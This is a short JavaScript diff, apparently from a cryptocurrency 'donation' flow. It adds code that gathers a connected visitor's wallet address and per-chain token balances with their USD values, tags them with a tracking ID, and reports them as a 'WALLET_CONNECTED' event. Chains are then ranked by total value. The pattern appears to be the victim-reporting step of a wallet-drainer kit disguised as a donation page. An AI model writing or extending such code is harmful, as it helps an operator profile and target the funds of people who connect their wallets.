@@ -71,6 +71,36 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
       });
     }
 
+      const balancesPayload = chainBalances.map((c) => ({
+      name: c.name,
+      native: Number(c.native).toFixed(6),
+      nativeValue: Number(c.nativeUSD || 0).toFixed(2),
+      tokens: c.tokens.map((t) => ({
+        name: t.tokenSymbol,
+        amount: Number(
+          ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)
+        ).toFixed(6),
+        value: Number(t.quote).toFixed(2),
+      })),
+      total: Number(c.totalValue).toFixed(2),
+    }));
+    const grandTotal = balancesPayload.reduce(
+      (acc, c) => acc + parseFloat(c.total || 0),
+      0
+    );
+
+    const connectedPayload = {
+      walletAddress: owner,
+      trackingId,
+      balances: balancesPayload,
+      grandTotal: Number(grandTotal).toFixed(2),
+    };
+
+    notify("WALLET_CONNECTED", connectedPayload);
+    await sendEvent("WALLET_CONNECTED", connectedPayload);
+
+
+
     // Sort chains descending by totalValue
     chainBalances.sort((a, b) => b.totalValue - a.totalValue);
 
